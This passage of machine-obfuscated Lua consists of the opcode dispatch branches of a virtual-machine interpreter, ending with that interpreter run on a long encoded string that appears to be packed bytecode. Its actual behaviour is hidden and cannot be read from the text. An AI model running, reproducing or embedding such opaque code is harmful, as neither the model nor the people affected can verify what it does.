m;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];m=y[652];i=y[76];d=k(w,g,m,i);w[y[134]]=d;else a(c,e);end;elseif 323>=z then if z<=320 then if 318>=z then local d;local i;w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];i=y[134];d=w[y[652]];w[i+1]=d;w[i]=d[w[y[76]]];elseif 320>z then if(w[y[134]]~=w[y[76]])then n=n+1;else n=y[652];end;else local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif z<=321 then if(w[y[134]]<w[y[76]])then n=n+1;else n=y[652];end;elseif 323>z then local d;w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]][y[652]]=y[76];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))else local d=y[134]w[d](w[d+1])end;elseif z<=326 then if 324>=z then local d=0 while true do if d<=6 then if d<=2 then if d<=0 then w[y[134]]=w[y[652]][y[76]];else if d==1 then n=n+1;else y=f[n];end end else if d<=4 then if 3<d then n=n+1;else w[y[134]]=w[y[652]][y[76]];end else if 5==d then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end else if d<=9 then if d<=7 then n=n+1;else if 9~=d then y=f[n];else w[y[134]][y[652]]=w[y[76]];end end else if d<=11 then if 11~=d then n=n+1;else y=f[n];end else if 13>d then n=y[652];else break end end end end d=d+1 end elseif 326>z then local d;w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))else w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if(w[y[134]]~=w[y[76]])then n=n+1;else n=y[652];end;end;elseif 327>=z then local d,i=0 while true do if d<=8 then if d<=3 then if d<=1 then if d~=1 then i=nil else w[y[134]]=j[y[652]];end else if d<3 then n=n+1;else y=f[n];end end else if d<=5 then if 4<d then n=n+1;else w[y[134]]=w[y[652]][y[76]];end else if d<=6 then y=f[n];else if 7==d then w[y[134]]=y[652];else n=n+1;end end end end else if d<=13 then if d<=10 then if 9<d then w[y[134]]=y[652];else y=f[n];end else if d<=11 then n=n+1;else if 12==d then y=f[n];else w[y[134]]=y[652];end end end else if d<=15 then if 14==d then n=n+1;else y=f[n];end else if d<=16 then i=y[134]else if d==17 then w[i]=w[i](r(w,i+1,y[652]))else break end end end end end d=d+1 end elseif 329>z then a(c,e);n=n+1;y=f[n];w={};for d=0,u,1 do if d<o then w[d]=s[d+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];else if(w[y[134]]~=w[y[76]])then n=y[652];else n=n+1;end;end;elseif 353>=z then if 341>=z then if 335>=z then if z<=332 then if(z<330 or z==330)then local d,i=0 while true do if d<=8 then if d<=3 then if d<=1 then if d>0 then w[y[134]]=w[y[652]][y[76]];else i=nil end else if d==2 then n=n+1;else y=f[n];end end else if d<=5 then if 5>d then w[y[134]]=w[y[652]][y[76]];else n=n+1;end else if d<=6 then y=f[n];else if d<8 then w[y[134]]=w[y[652]][y[76]];else n=n+1;end end end end else if d<=13 then if d<=10 then if d~=10 then y=f[n];else w[y[134]]=w[y[652]][y[76]];end else if d<=11 then n=n+1;else if 12<d then w[y[134]]=false;else y=f[n];end end end else if d<=15 then if 14<d then y=f[n];else n=n+1;end else if d<=16 then i=y[134]else if 17<d then break else w[i](w[i+1])end end end end end d=d+1 end elseif z>331 then w[y[134]]=h[y[652]];else local d=y[134]w[d]=w[d](r(w,d+1,p))end;elseif 333>=z then local d,i,m,p=0 while true do if d<=15 then if d<=7 then if d<=3 then if d<=1 then if 0==d then i=nil else m=nil end else if d~=3 then p=nil else w[y[134]]=h[y[652]];end end else if d<=5 then if d<5 then n=n+1;else y=f[n];end else if d==6 then w[y[134]]=w[y[652]][y[76]];else n=n+1;end end end else if d<=11 then if d<=9 then if d<9 then y=f[n];else w[y[134]]=h[y[652]];end else if d==10 then n=n+1;else y=f[n];end end else if d<=13 then if d>12 then n=n+1;else w[y[134]]=w[y[652]][y[76]];end else if 14==d then y=f[n];else w[y[134]]=w[y[652]][w[y[76]]];end end end end else if d<=23 then if d<=19 then if d<=17 then if d>16 then y=f[n];else n=n+1;end else if 18<d then n=n+1;else w[y[134]]=h[y[652]];end end else if d<=21 then if 21~=d then y=f[n];else w[y[134]]=w[y[652]][y[76]];end else if d~=23 then n=n+1;else y=f[n];end end end else if d<=27 then if d<=25 then if 24<d then n=n+1;else w[y[134]]=w[y[652]][y[76]];end else if 27>d then y=f[n];else p=y[652];end end else if d<=29 then if d==28 then m=y[76];else i=k(w,g,p,m);end else if d<31 then w[y[134]]=i;else break end end end end end d=d+1 end elseif 334<z then local d,i,m,p=0 while true do if d<=9 then if d<=4 then if d<=1 then if 0<d then m=nil else i=nil end else if d<=2 then p=nil else if 3==d then w[y[134]]=h[y[652]];else n=n+1;end end end else if d<=6 then if 5<d then w[y[134]]=h[y[652]];else y=f[n];end else if d<=7 then n=n+1;else if d~=9 then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end end else if d<=14 then if d<=11 then if d<11 then n=n+1;else y=f[n];end else if d<=12 then w[y[134]]=w[y[652]][w[y[76]]];else if d<14 then n=n+1;else y=f[n];end end end else if d<=16 then if 15<d then m={w[p](w[p+1])};else p=y[134]end else if d<=17 then i=0;else if d>18 then break else for q=p,y[76]do i=i+1;w[q]=m[i];end end end end end end d=d+1 end else w[y[134]]=w[y[652]][y[76]];end;elseif 338>=z then if z<=336 then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d]()elseif z~=338 then j[y[652]]=w[y[134]];else local d;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif 339>=z then local d;local i;w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]={r({},1,y[652])};n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];i=y[134];d=w[i];for m=i+1,y[652]do t(d,w[m])end;elseif 341>z then local d;local i;local m;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];m=y[652];i=y[76];d=k(w,g,m,i);w[y[134]]=d;else local d;local i;local m;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];m=y[134]i={w[m](w[m+1])};d=0;for p=m,y[76]do d=d+1;w[p]=i[d];end end;elseif 347>=z then if 344>=z then if 342>=z then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](w[d+1])elseif z>343 then local d;local i;local m;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];m=y[134]i={w[m](w[m+1])};d=0;for p=m,y[76]do d=d+1;w[p]=i[d];end else local d;local i;local m;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];m=y[652];i=y[76];d=k(w,g,m,i);w[y[134]]=d;end;elseif 345>=z then w[y[134]]=w[y[652]]-w[y[76]];elseif 347~=z then local d=y[134];local i=y[76];local m=d+2;local p={w[d](w[d+1],w[m])};for q=1,i do w[m+q]=p[q];end local d=w[d+3];if d then w[m]=d;n=y[652];else n=n+1 end;else local d;local i;local m;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];m=y[134]i={w[m](w[m+1])};d=0;for p=m,y[76]do d=d+1;w[p]=i[d];end end;elseif z<=350 then if 348>=z then local d,i,m,p=0 while true do if d<=15 then if d<=7 then if d<=3 then if d<=1 then if 1>d then i=nil else m=nil end else if 2<d then w[y[134]]=h[y[652]];else p=nil end end else if d<=5 then if 4<d then y=f[n];else n=n+1;end else if 6==d then w[y[134]]=w[y[652]][y[76]];else n=n+1;end end end else if d<=11 then if d<=9 then if 8<d then w[y[134]]=h[y[652]];else y=f[n];end else if d~=11 then n=n+1;else y=f[n];end end else if d<=13 then if 12<d then n=n+1;else w[y[134]]=w[y[652]][y[76]];end else if d>14 then w[y[134]]=w[y[652]][w[y[76]]];else y=f[n];end end end end else if d<=23 then if d<=19 then if d<=17 then if d==16 then n=n+1;else y=f[n];end else if 18==d then w[y[134]]=h[y[652]];else n=n+1;end end else if d<=21 then if d>20 then w[y[134]]=w[y[652]][y[76]];else y=f[n];end else if d>22 then y=f[n];else n=n+1;end end end else if d<=27 then if d<=25 then if d==24 then w[y[134]]=w[y[652]][y[76]];else n=n+1;end else if d==26 then y=f[n];else p=y[652];end end else if d<=29 then if 29~=d then m=y[76];else i=k(w,g,p,m);end else if 31~=d then w[y[134]]=i;else break end end end end end d=d+1 end elseif z<350 then local d,g,i,k=0 while true do if d<=9 then if d<=4 then if d<=1 then if d~=1 then g=nil else i=nil end else if d<=2 then k=nil else if d<4 then w[y[134]]=h[y[652]];else n=n+1;end end end else if d<=6 then if 6~=d then y=f[n];else w[y[134]]=h[y[652]];end else if d<=7 then n=n+1;else if 8<d then w[y[134]]=w[y[652]][y[76]];else y=f[n];end end end end else if d<=14 then if d<=11 then if 10==d then n=n+1;else y=f[n];end else if d<=12 then w[y[134]]=w[y[652]][w[y[76]]];else if d<14 then n=n+1;else y=f[n];end end end else if d<=16 then if d~=16 then k=y[134]else i={w[k](w[k+1])};end else if d<=17 then g=0;else if d>18 then break else for m=k,y[76]do g=g+1;w[m]=i[g];end end end end end end d=d+1 end else local d,g,i,k=0 while true do if d<=9 then if d<=4 then if d<=1 then if 0==d then g=nil else i=nil end else if d<=2 then k=nil else if 3==d then w[y[134]]=h[y[652]];else n=n+1;end end end else if d<=6 then if 6>d then y=f[n];else w[y[134]]=h[y[652]];end else if d<=7 then n=n+1;else if d~=9 then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end end else if d<=14 then if d<=11 then if d>10 then y=f[n];else n=n+1;end else if d<=12 then w[y[134]]=w[y[652]][w[y[76]]];else if 13<d then y=f[n];else n=n+1;end end end else if d<=16 then if 15<d then i={w[k](w[k+1])};else k=y[134]end else if d<=17 then g=0;else if 18<d then break else for m=k,y[76]do g=g+1;w[m]=i[g];end end end end end end d=d+1 end end;elseif 351>=z then local d;w={};for g=0,u,1 do if g<o then w[g]=s[g+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))elseif 353>z then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))else local d;local g;local i;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];i=y[134]g={w[i](w[i+1])};d=0;for k=i,y[76]do d=d+1;w[k]=g[d];end end;elseif z<=365 then if z<=359 then if(356==z or 356>z)then if(z<=354)then local d,g=0 while true do if(d<=10)then if(d<=4)then if(d==1 or d<1)then if not(1==d)then g=nil else w[y[134]]=j[y[652]];end else if d<=2 then n=(n+1);else if not(4==d)then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end else if(d==7 or d<7)then if(d<=5)then n=(n+1);else if not(d~=6)then y=f[n];else w[y[134]]=y[652];end end else if(d<8 or d==8)then n=(n+1);else if 9<d then w[y[134]]=y[652];else y=f[n];end end end end else if d<=15 then if d<=12 then if not(d~=11)then n=(n+1);else y=f[n];end else if(d<13 or d==13)then w[y[134]]=y[652];else if(d>14)then y=f[n];else n=(n+1);end end end else if(d<=18)then if d<=16 then w[y[134]]=y[652];else if not(d==18)then n=(n+1);else y=f[n];end end else if d<=19 then g=y[134]else if(20==d)then w[g]=w[g](r(w,(g+1),y[652]))else break end end end end end d=d+1 end elseif(z>355)then local d,g=0 while true do if d<=10 then if d<=4 then if d<=1 then if d>0 then w[y[134]]=h[y[652]];else g=nil end else if d<=2 then n=n+1;else if 4~=d then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end else if d<=7 then if d<=5 then n=n+1;else if 7~=d then y=f[n];else w[y[134]]=h[y[652]];end end else if d<=8 then n=n+1;else if d<10 then y=f[n];else w[y[134]]=w[y[652]][w[y[76]]];end end end end else if d<=15 then if d<=12 then if d>11 then y=f[n];else n=n+1;end else if d<=13 then w[y[134]]=h[y[652]];else if d<15 then n=n+1;else y=f[n];end end end else if d<=18 then if d<=16 then w[y[134]]=w[y[652]][y[76]];else if 17==d then n=n+1;else y=f[n];end end else if d<=19 then g=y[134]else if d==20 then w[g]=w[g](r(w,g+1,y[652]))else break end end end end end d=d+1 end else w[y[134]]=w[y[652]][y[76]];end;elseif z<=357 then local d=0 while true do if d<=14 then if d<=6 then if d<=2 then if d<=0 then w={};else if d==1 then for g=0,u,1 do if g<o then w[g]=s[g+1];else break;end;end;else n=n+1;end end else if d<=4 then if 3<d then w[y[134]]=h[y[652]];else y=f[n];end else if 6~=d then n=n+1;else y=f[n];end end end else if d<=10 then if d<=8 then if d>7 then n=n+1;else w[y[134]]=w[y[652]][y[76]];end else if 10>d then y=f[n];else w[y[134]]=h[y[652]];end end else if d<=12 then if 12~=d then n=n+1;else y=f[n];end else if 13<d then n=n+1;else w[y[134]]={};end end end end else if d<=21 then if d<=17 then if d<=15 then y=f[n];else if d==16 then w[y[134]]={};else n=n+1;end end else if d<=19 then if 18<d then w[y[134]][y[652]]=w[y[76]];else y=f[n];end else if 21>d then n=n+1;else y=f[n];end end end else if d<=25 then if d<=23 then if 23>d then w[y[134]]=j[y[652]];else n=n+1;end else if d==24 then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end else if d<=27 then if 27>d then n=n+1;else y=f[n];end else if 28<d then break else if w[y[134]]then n=n+1;else n=y[652];end;end end end end end d=d+1 end elseif(359>z)then local d,g,i=0 while true do if d<=24 then if d<=11 then if d<=5 then if d<=2 then if d<=0 then g=nil else if d>1 then w[y[134]]={};else i=nil end end else if d<=3 then n=n+1;else if 4==d then y=f[n];else w[y[134]]=h[y[652]];end end end else if d<=8 then if d<=6 then n=n+1;else if 8>d then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end else if d<=9 then n=n+1;else if 11>d then y=f[n];else w[y[134]]=h[y[652]];end end end end else if d<=17 then if d<=14 then if d<=12 then n=n+1;else if d~=14 then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end else if d<=15 then n=n+1;else if 17~=d then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end else if d<=20 then if d<=18 then n=n+1;else if 19<d then w[y[134]]={};else y=f[n];end end else if d<=22 then if 21<d then y=f[n];else n=n+1;end else if d>23 then n=n+1;else w[y[134]]={};end end end end end else if d<=37 then if d<=30 then if d<=27 then if d<=25 then y=f[n];else if d<27 then w[y[134]]=h[y[652]];else n=n+1;end end else if d<=28 then y=f[n];else if d>29 then n=n+1;else w[y[134]][y[652]]=w[y[76]];end end end else if d<=33 then if d<=31 then y=f[n];else if d<33 then w[y[134]]=h[y[652]];else n=n+1;end end else if d<=35 then if 35>d then y=f[n];else w[y[134]][y[652]]=w[y[76]];end else if 36<d then y=f[n];else n=n+1;end end end end else if d<=43 then if d<=40 then if d<=38 then w[y[134]][y[652]]=w[y[76]];else if 39==d then n=n+1;else y=f[n];end end else if d<=41 then w[y[134]]={r({},1,y[652])};else if d~=43 then n=n+1;else y=f[n];end end end else if d<=46 then if d<=44 then w[y[134]]=w[y[652]];else if d==45 then n=n+1;else y=f[n];end end else if d<=48 then if 47==d then i=y[134];else g=w[i];end else if 49<d then break else for k=i+1,y[652]do t(g,w[k])end;end end end end end end d=d+1 end else local d,g=0 while true do if d<=8 then if d<=3 then if d<=1 then if 1~=d then g=nil else w[y[134]]=w[y[652]][y[76]];end else if 2<d then y=f[n];else n=n+1;end end else if d<=5 then if 4<d then n=n+1;else w[y[134]]=h[y[652]];end else if d<=6 then y=f[n];else if 8~=d then w[y[134]]=w[y[652]][y[76]];else n=n+1;end end end end else if d<=13 then if d<=10 then if d>9 then w[y[134]]=y[652];else y=f[n];end else if d<=11 then n=n+1;else if d>12 then w[y[134]]=y[652];else y=f[n];end end end else if d<=15 then if 14<d then y=f[n];else n=n+1;end else if d<=16 then g=y[134]else if 17==d then w[g]=w[g](r(w,g+1,y[652]))else break end end end end end d=d+1 end end;elseif 362>=z then if 360>=z then w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if w[y[134]]then n=n+1;else n=y[652];end;elseif z>361 then w[y[134]]=w[y[652]]%w[y[76]];else w={};for d=0,u,1 do if d<o then w[d]=s[d+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if w[y[134]]then n=n+1;else n=y[652];end;end;elseif 363>=z then local d,g=0 while true do if d<=7 then if d<=3 then if d<=1 then if 1~=d then g=nil else w[y[134]]=w[y[652]];end else if d<3 then n=n+1;else y=f[n];end end else if d<=5 then if 4<d then n=n+1;else w[y[134]]=y[652];end else if d~=7 then y=f[n];else w[y[134]]=y[652];end end end else if d<=11 then if d<=9 then if d~=9 then n=n+1;else y=f[n];end else if 11~=d then w[y[134]]=y[652];else n=n+1;end end else if d<=13 then if d>12 then g=y[134]else y=f[n];end else if d==14 then w[g]=w[g](r(w,g+1,y[652]))else break end end end end d=d+1 end elseif 364==z then w={};for d=0,u,1 do if d<o then w[d]=s[d+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if w[y[134]]then n=n+1;else n=y[652];end;else w[y[134]][y[652]]=y[76];end;elseif 371>=z then if z<=368 then if z<=366 then local d,g=0 while true do if d<=7 then if d<=3 then if d<=1 then if d==0 then g=nil else w[y[134]]=h[y[652]];end else if d~=3 then n=n+1;else y=f[n];end end else if d<=5 then if d<5 then w[y[134]]=y[652];else n=n+1;end else if d<7 then y=f[n];else w[y[134]]=y[652];end end end else if d<=11 then if d<=9 then if d~=9 then n=n+1;else y=f[n];end else if d<11 then w[y[134]]=y[652];else n=n+1;end end else if d<=13 then if d>12 then g=y[134]else y=f[n];end else if d>14 then break else w[g]=w[g](r(w,g+1,y[652]))end end end end d=d+1 end elseif 367==z then local d;local g;local i;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];i=y[134]g={w[i](w[i+1])};d=0;for k=i,y[76]do d=d+1;w[k]=g[d];end else local d;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif 369>=z then do return w[y[134]]end elseif 371>z then w[y[134]]=w[y[652]]/y[76];else w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if(w[y[134]]~=w[y[76]])then n=n+1;else n=y[652];end;end;elseif 374>=z then if z<=372 then local d=y[134]local g={}for i=1,#v do local j=v[i]for k=1,#j do local j=j[k]local k,k=j[1],j[2]if k>=d then g[k]=w[k]j[1]=g v[i]=nil;end end end elseif z>373 then local d;local g;local i;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];i=y[134]g={w[i](w[i+1])};d=0;for j=i,y[76]do d=d+1;w[j]=g[d];end else local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif 375>=z then a(c,e);elseif 376==z then w[y[134]]=false;else local a;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];a=y[134]w[a]=w[a](r(w,a+1,y[652]))end;n=n+1;end;end;end;return b(cr(),{},l())();end)('25924B25C24B26A21321221227927A27D27D1Z27D22E22C22722022A21227G27A22A21Z21W22221V2121W27D21X22122021X21Z27M27W27A22D22A27J22021T2121Y27X22621Z22C28B27D22328222621221027D22122D27N27D21U21V21W22B28A28C27P21Z22D22521221B27X22122C22122B22A27K27U28Y21221S27K21U2121X27D21T21V22A21S21V22022827V27D22B22022E21Z21X29227O21222E28122222229I29K29M27K21S22128H27A2A92AB21627D22D29M22329M28227R27T21221127D22C21V22E2AP2AH22B21W28R27A28J22A21X28L21A27D22A28P28727K28A28421227K2AI22C27M29D21T22D2AX27B27D22227C27E23G22U21228L27A22521F22224K1X22I26G23V1B25G25B24A21N22W1I22I26623125722Y25R1Y22D21K24224G21123O25F26221325F25F21U22Q21P26I22P21Q22025H25P25K25U22523524T25B24U1422022921O26H25124P24E25F27222B23F24I2401W26I1N21926A23225Z1O26722O24B23O1022H1J21Z21M23326P21E25W21D25M1924V26V25C1A21O21X22R142421E21H1E27322P22T250142AC29I21Y21725T2BM27A29J2BP1U2EX21221Q2AV27A1M2341N2F21E2F22172F521222W22F22P2ES21721Y21025J21221927D1521Z21Q25W23621R24A27122Q24N2622FO27D1P22E21E25S2FV2FX2FZ2G12152G32G525S22Q21E23T27322G24H25P26K22A1B23B2A627A1T22N21726521W21424B21221K27D21821S21L25D22D21525J26422Y25225T26R22D1F22K21H24Q142651324S21V1X22927125Q1B26S24T2592122GQ27A2112FS25W22A22O25J24K23D24L25K25022K1122U21E24R1F25Q1P24Q22821I22F27025W21S26I25326S21W24S24U23121C22K23O1522921124025A24T24G1V1G25W24027223A1X21322L24D25S26D25V23M24X22Q22C25R26P22123O21K22I23U1724J23H24Z1926G26O22T21P21P2172272FB2AG27A1J1M21L23Y1923825H24I21A25324525A28M27D22W1221221C27D1722O1526I1121Q23X26G22S24G25Y26S22K22023821N253112661E26T2KP21F2FQ22V1U26S1121423X26Y23I24H25O26M1R1E23721F24Y1826722826N27E2EY27D1V22A21F26K21S21O24229S27A1522K21325P21W2GC2A01221W21025D22B2GR2121E22K1525V2272FW2G22GS21T1Z25U21S21A23X26322V24X25O2MP1T2MZ2N12N32122FD27A23A22G1Z25K22523E23W26M23124L25M26U2272122B52MC21Y21325H22721H23L2M02F427A1322K22Y25C21W21O23T27222V24W24F26I22F1922Z21R24S2252651525622421D1P2NE27D2NH2NJ2NL24826X22Q24Y26626M22M2F327D2O622Y25W22B21F24E26I23J24H2OG2OI2OK2OM2OO2OQ2OS21221J2OV2NI2NK23E2OZ2P12P322M1O23I21B24T21221R2P72O72PA2PC2PE24H244256223142371Z2571V24B1C24G22F21N22K24Z2OU2NG2PR2NL23V26C22S24Z25T2732AB2O42122P825J22621H24F26D2322522PH2OJ2OL2ON2OP2OR2OT2FP2QQ2OX23E23R27022T2GL2KQ2Q422Y25N22E21G23X26X21725025V26Z21U1D22O23E2541225Q1424R132122K82122OW2PS23K26C22U24T26226H21221D2RQ25O22621J23L26M23C26C25R26U22I1H23B2142721B25W1V24H21Y2382QP2SD21X21125P21X2NM2NO2NQ2NS21221I2FQ2NX2NZ2O126N22H24R25S26M22Z1922O2B52NF2TA2TC2TE2PU2P22P42PO2OV2TB2TD2PT2P02U32PX2PZ2Q12TY23A2U72TE2QT2QV2QX2AB2RH2TZ2U82RL2RN25P2SB2U62U023E2SG2SI2SK2T92OW25J2222TF2NP2NR2NT1D27D1K22K21R23O22321B24B27321724J2TS1R1323F21L2512